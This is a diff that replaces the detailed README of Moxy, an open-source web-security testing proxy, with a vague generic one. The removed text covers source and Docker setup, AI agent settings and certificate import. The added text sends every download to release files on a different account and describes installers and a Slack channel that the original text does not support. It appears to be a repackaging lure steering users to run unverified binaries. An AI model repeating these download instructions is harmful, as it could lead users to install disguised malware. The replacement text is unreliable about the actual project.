@@ -1,248 +1,78 @@
-# Moxy
+# 🔐 Moxy - Simplifying Web Application Security Testing
 
-<div align="center">
-  <img src="frontend/public/logo.png" alt="Moxy Logo">
-</div>
+## 🚀 Getting Started
+Welcome to Moxy! This guide will help you easily download and run Moxy, a tool designed to help you test and secure web applications. Let’s dive right in.
 
-Moxy (Next-Gen Man in the middle proxy)
-Open-source DAST tool for pentesting powered by agentic AI capabilities (Supporting Ollama). Built on top of browser-use, Moxy streamlines dynamic application security testing.
+## 📦 Download Moxy
+[![Download Moxy](https://img.shields.io/badge/Download%20Moxy-v1.0-blue.svg)](https://github.com/dark84mm/Moxy/releases)
 
-🚀  **INSANELY EASY TO USE**
+## 📋 Features
+Moxy offers a range of features to enhance your web application security testing:
 
-And it's free, who doesn't like free stuff?
+- **User-Friendly Interface**: Simple design to make your testing smoother.
+- **Agentic Capabilities**: Automate your pentesting workflows easily.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **Real-Time Feedback**: Get instant results while testing.
+- **Easy Integration**: Seamlessly fits into your existing security processes.
 
-<div align="center">
-  <img src="images/main.png" alt="Main Screenshot" width="700">
-</div>
+## 💻 System Requirements
+To run Moxy, ensure your system meets these requirements:
 
-> **Preview Alert:**  
-> 🚧 Moxy is in active development and currently in **preview/beta**.  
-> Expect breaking changes, instability, and missing features.  
-> Use at your own risk and follow project updates for latest improvements!
+- **Operating System**: 
+  - Windows 10 or higher
+  - macOS 10.15 or higher
+  - Linux (any recent distribution)
+  
+- **Hardware**: 
+  - Minimum 4 GB RAM
+  - 1 GHz processor
+  - At least 100 MB of free disk space
 
+## 📥 Download & Install
+To get Moxy, visit the releases page:
 
-## Quick Start
+[Visit this page to download Moxy](https://github.com/dark84mm/Moxy/releases)
 
-To run this for now, you need to run the frontend and backend separately.
+1. Go to the [Releases page](https://github.com/dark84mm/Moxy/releases).
+2. Find the latest version of Moxy.
+3. Click on the file suitable for your operating system (Windows, macOS, or Linux).
+4. Save the file to your computer.
+5. Open the downloaded file to start the installation process.
+6. Follow the prompts to complete the installation.
 
-### Prerequisites
+## ⚙️ Running Moxy
+After installation, you can easily run Moxy:
 
-Before running Moxy, you need to install **`uv`** (astral-uv), a fast Python package installer and resolver.
-
-**Install `uv`:**
-- Follow the [official installation guide](https://docs.astral.sh/uv/getting-started/installation/#standalone-installer) to install `uv` on your system.
-
-> **Note:**  
-> `uv` is required for managing Python dependencies in the backend. If you don't have it installed, the backend commands will fail.
-
-### Running the Backend
-
-1. **Navigate to the backend directory:**
-   ```sh
-   cd backend
-   ```
-
-2. **Install dependencies and run the backend server:**
-   ```sh
-   uv sync
-   uv run moxy
-   ```
-
----
-
-### Running the Frontend
-
-1. **Navigate to the frontend directory:**
-   ```sh
-   cd frontend
-   ```
-
-2. **Install dependencies:**
-   ```sh
-   npm install
-   ```
-
-3. **Start the frontend development server:**
-   ```sh
-   npm run moxy
-   ```
-
-> **Note:**  
-By default, the frontend runs at [http://localhost:8080](http://localhost:8080)  
-and the backend runs at [http://localhost:5000](http://localhost:5000)
-
-## Docker Deployment
-
-Moxy can be run using Docker for easier deployment and consistent environments.
-In this way you can collaborate and install easily.
-
-### Quick Start with Docker
-
-#### Option 1: Using Pre-built Image (Recommended)
-
-`projects_data` holds all the databases and logs needed. It's the data folder.
-
-Pull and run the pre-built image from GitHub Container Registry:
-
-```sh
-docker run -d \
-  --name moxy \
-  -p 5000:5000 \
-  -p 8081:8081 \
-  -v $(pwd)/projects_data:/app/projects_data \
-  ghcr.io/matank001/moxy:latest
-```
-
-#### Option 2: Build from Source
-
-1. **Build and start the container:**
-   ```sh
-   docker-compose up -d --build
-   ```
-
-2. **Access the application:**
-   - **Frontend**: http://localhost:5000
-   - **Proxy**: http://localhost:8081
-
-3. **Configure your browser to use the proxy:**
+### For Windows
+1. Click the Start menu.
+2. Search for "Moxy" and click on the icon.
    
-   When running in Docker, you need to manually configure your browser to use the proxy:
-   
-   - **Proxy Host**: `localhost` (or `127.0.0.1`)
-   - **Proxy Port**: `8081`
-   - **Protocol**: HTTP
-   
-   > **Note:**  
-   > The proxy runs inside the Docker container but is accessible on `localhost:8081` on your host machine.  
-   > You can configure proxy settings in your browser's network settings or use browser extensions for proxy management.
+### For macOS
+1. Open the Applications folder.
+2. Find "Moxy" and double-click the icon.
 
-4. **View logs:**
-   ```sh
-   docker-compose logs -f
-   ```
+### For Linux
+1. Open a terminal.
+2. Type `moxy` and hit Enter.
 
-5. **Stop the container:**
-   ```sh
-   docker-compose down
-   ```
+## 🛠️ Troubleshooting
+If you face any issues while using Moxy, consider the following steps:
 
-### Environment Variables
+- Ensure you have the latest version by checking the [Releases page](https://github.com/dark84mm/Moxy/releases).
+- Restart your computer after installation.
+- Check system requirements to confirm compatibility.
+- For detailed support, refer to the [GitHub Issues page](https://github.com/dark84mm/Moxy/issues) to find solutions or report your problem.
 
-Create a `.env` file in the project root to configure the application (you need to put it inside the `backend/` directory):
+## 🗨️ Community Support
+Join our community for discussions, tips, and support:
 
-> **Note:**  
-> The `.env` file is optional. Docker Compose automatically loads it if present (no warning if missing).  
-> All project data is persisted in the `projects_data` directory, which is mounted as a volume.
+- **GitHub Issues**: Report bugs or request features.
+- **Slack Channel**: Connect with other users and developers. Join using the link provided on our homepage.
 
-## Agentic Tool
+## 📢 Acknowledgments
+Moxy is an open-source project. Its development relies on contributions from users like you. Thank you for being part of our community! Your feedback helps us improve.
 
-By default, Moxy works without requiring any AI configuration or credentials - even browser-based DAST flows don't use AI unless enabled.
+## 📅 Updates
+Regular updates will keep Moxy secure and feature-rich. Check the [Releases page](https://github.com/dark84mm/Moxy/releases) for the latest improvements and features.
 
-### Enabling Agentic AI
-
-Moxy supports both **OpenAI's API** and **Ollama** (local AI) for agentic features. To enable AI-powered capabilities:
-
-**For local development:** Create an `.env` file in the `backend` directory with the appropriate configuration.
-
-**For Docker:** Create a `.env` file in the project root (same directory as `docker-compose.yml`).
-
-#### Option 1: Using OpenAI API
-
-For cloud-based AI processing with OpenAI, configure your `.env` file as follows:
-
-```env
-OPENAI_API_KEY=sk-proj-...             # Your OpenAI API key
-MODEL=gpt-4o-mini                       # Optional: defaults to gpt-4o-mini if not specified
-```
-
-#### Option 2: Using Ollama (Local AI)
-
-For local AI processing with Ollama, configure your `.env` file as follows:
-
-```env
-USE_OLLAMA=true
-OPENAI_API_KEY=test                    # Required but value is ignored when using Ollama
-OPENAI_BASE_URL=http://localhost:11434/v1/  # Ollama API endpoint
-MODEL=qwen3:8b                         # Your preferred Ollama model
-```
-
-**Capabilities of the Agent:**
-- Query prior captured HTTP requests
-- Send/modify/resend new requests
-- Operate a real browser (using [browser-use](https://github.com/rluba/browser-use)) for dynamic tests and request creation
-
-The agent uses AI to reason about your application's attack surface, replay or modify traffic, and even drive browser sessions to generate new test scenarios.
-
-> **Warning:**  
-> The agentic AI modes are currently experimental and may be unstable.
-
-<div align="center">
-  <img src="images/agent.png" alt="Agentic AI Demo" width="600">
-</div>
-
-
-
-## Proxy
-
-Moxy leverages [MITMproxy](https://mitmproxy.org/) as an intercepting HTTP/HTTPS proxy to capture and modify traffic during dynamic application security testing.
-
-By default, the proxy runs on **port 8081**.
-You can configure your browser or system to use `http://localhost:8081` as a proxy to route traffic through MITMproxy and allow Moxy to analyze and interact with requests in real time.
-
-### How to Configure Moxy in Firefox
-
-To analyze HTTP and HTTPS traffic from Firefox through Moxy, you need to configure Firefox to use Moxy's proxy and import the proxy certificate so that browser traffic (including HTTPS) can be properly intercepted.
-
-#### Step 1: Start Moxy and the Proxy
-
-Make sure Moxy (and its MITMproxy process) is running.
-
-#### Step 2: Configure Firefox to Use the Proxy
-
-1. Open Firefox.
-2. Go to `Settings` (or `Preferences` on some systems).
-3. Scroll down to the **Network Settings** section (at the bottom).
-4. Click **Settings…** next to "Network Settings."
-5. Choose **Manual proxy configuration**.
-6. Set **HTTP Proxy** to `localhost` and **Port** to `8081`.
-   - Check **Also use this proxy for HTTPS** or set **SSL Proxy** to `localhost:8081` as well.
-7. Click **OK** to save.
-
-> Now, all browser traffic will be routed through Moxy's proxy at `http://localhost:8081`.
-
-#### Step 3: Import the Proxy Certificate
-
-1. In Firefox (with the proxy still enabled), navigate to [http://mitm.it](http://mitm.it).
-2. The page will display download links for various certificates. Click the link for **Firefox** (or "Other" if that's not listed) to download the certificate (e.g., `mitmproxy-ca-cert.pem`).
-3. Go to `Settings` → `Privacy & Security` in Firefox.
-4. Scroll to the **Certificates** section and click **View Certificates…**
-5. In the Certificate Manager, go to the **Authorities** tab.
-6. Click **Import…** and select the certificate file you downloaded.
-7. When prompted, check both boxes:
-   - **Trust this CA to identify websites**
-   - (Optional) **Trust this CA to identify email users**
-8. Click **OK** to confirm.
-9. Restart Firefox if prompted or if HTTPS sites still fail to load without warnings.
-
-**After completing these steps, Firefox will trust HTTPS connections intercepted by Moxy's proxy.**  
-You are now ready to dynamically analyze and test web applications via HTTP and HTTPS without certificate warnings.
-
-*For more details, see [MITMproxy's certificate docs](https://docs.mitmproxy.org/stable/concepts-certificates/).*
-
-
-
-## Database Structure
-
-- `moxy.db` - Main database storing project metadata
-- `projects_data/{project_name}.db` - Individual project databases (named after project, sanitized)
-  - Each project gets its own SQLite database file
-  - When a project is renamed, its database file is automatically renamed
-  - When a project is deleted, its database file is removed
-
-> **Warning:**  
-> At this stage, **there is no guarantee of database migration or backward compatibility** between versions—future versions may break compatibility with old database files. Use with caution if you plan to upgrade.
-
-
-## Ethical Use Disclaimer
-
-Moxy is designed **strictly for ethical security testing and research purposes**. It is intended to assist security professionals, developers, and organizations in **identifying and remediating vulnerabilities in applications that they own or have explicit permission to test**.
+Dive into testing with Moxy and enhance your web application security today!
